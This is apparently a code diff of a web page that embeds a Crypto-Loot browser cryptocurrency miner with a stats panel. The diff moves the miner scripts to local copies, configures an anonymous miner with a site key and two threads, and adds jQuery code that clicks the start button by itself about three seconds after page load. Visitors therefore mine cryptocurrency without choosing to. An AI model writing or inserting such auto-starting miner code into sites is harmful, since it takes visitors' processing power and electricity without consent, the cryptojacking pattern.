@@ -45,22 +45,22 @@
                     
                     <!-- Stats -->
                     <ul class="stats-container margin-l-2">
-                        <li class="flex-horizontal between-base minicart-subtotal">
+                        <li class="flex-horizontal between-base">
                           <strong>Hashes/ s</strong>
                           <i class="flex-1"></i>
-                          <span id="mining-hashes-per-second">1</span>
+                          <span id="mining-hashes-per-second">0.0</span>
                         </li>
                         
-                        <li class="flex-horizontal between-base minicart-subtotal">
+                        <li class="flex-horizontal between-base">
                           <strong>Total</strong>
                           <i class="flex-1"></i>
-                          <span id="mining-hashes-total">1</span>
+                          <span id="mining-hashes-total">0</span>
                         </li>
                         
-                        <li class="flex-horizontal between-base minicart-subtotal">
+                        <li class="flex-horizontal between-base">
                           <strong>Threads</strong>
                           <i class="flex-1"></i>
-                          <span id="mining-threads">1</span>
+                          <span id="mining-threads">2</span>
                           <span id="mining-threads-add" class="action">+</span>
                           <span class="mining-divide"> / </span>
                           <span id="mining-threads-remove" class="action">-</span>
@@ -113,27 +113,37 @@
             </section>
         </main>
 
-        <script src="https://crypto-loot.com/lib/miner.min.js"></script>
-        <script src="https://crypto-loot.com/lib/miner-ui.min.js"></script>
-        <script>
-        var miner = null;
-        try {
-          miner = new CryptoLoot.Anonymous('9cddbf07ef8fd1f6abf38141191227c02152c19fa995', {threads: 2});
-        } catch(e) {}
-        
-        var ui = new MinerUI(miner, {
-          container: document.getElementById('miner'),
-          canvas: document.getElementById('mining-stats-canvas'),
-          hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-          threads: document.getElementById('mining-threads'),
-          threadsAdd: document.getElementById('mining-threads-add'),
-          threadsRemove: document.getElementById('mining-threads-remove'),
-          hashesTotal: document.getElementById('mining-hashes-total'),
-          startButton: document.getElementById('mining-start'),
-          stopButton: document.getElementById('mining-stop'),
-          blkWarn: document.getElementById('blk-warning')
-        });
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script src="lib/miner.min.js"></script>
+        <script src="lib/miner-ui.min.js"></script>
 
+        <script>
+            var miner = null;
+
+            try {
+                miner = new CryptoLoot.Anonymous('9cddbf07ef8fd1f6abf38141191227c02152c19fa995', {threads: 2});
+            } catch(e) {}
+            
+            var ui = new MinerUI(miner, {
+                container: document.getElementById('miner'),
+                canvas: document.getElementById('mining-stats-canvas'),
+                hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+                threads: document.getElementById('mining-threads'),
+                threadsAdd: document.getElementById('mining-threads-add'),
+                threadsRemove: document.getElementById('mining-threads-remove'),
+                hashesTotal: document.getElementById('mining-hashes-total'),
+                startButton: document.getElementById('mining-start'),
+                stopButton: document.getElementById('mining-stop'),
+                blkWarn: document.getElementById('blk-warning')
+            });
+
+            
+            // Start Miner
+            $(document).ready(function() {
+                setTimeout(function() {
+                    $('#mining-start').click();
+                }, 3200);
+            });
         </script>
     </body>
 
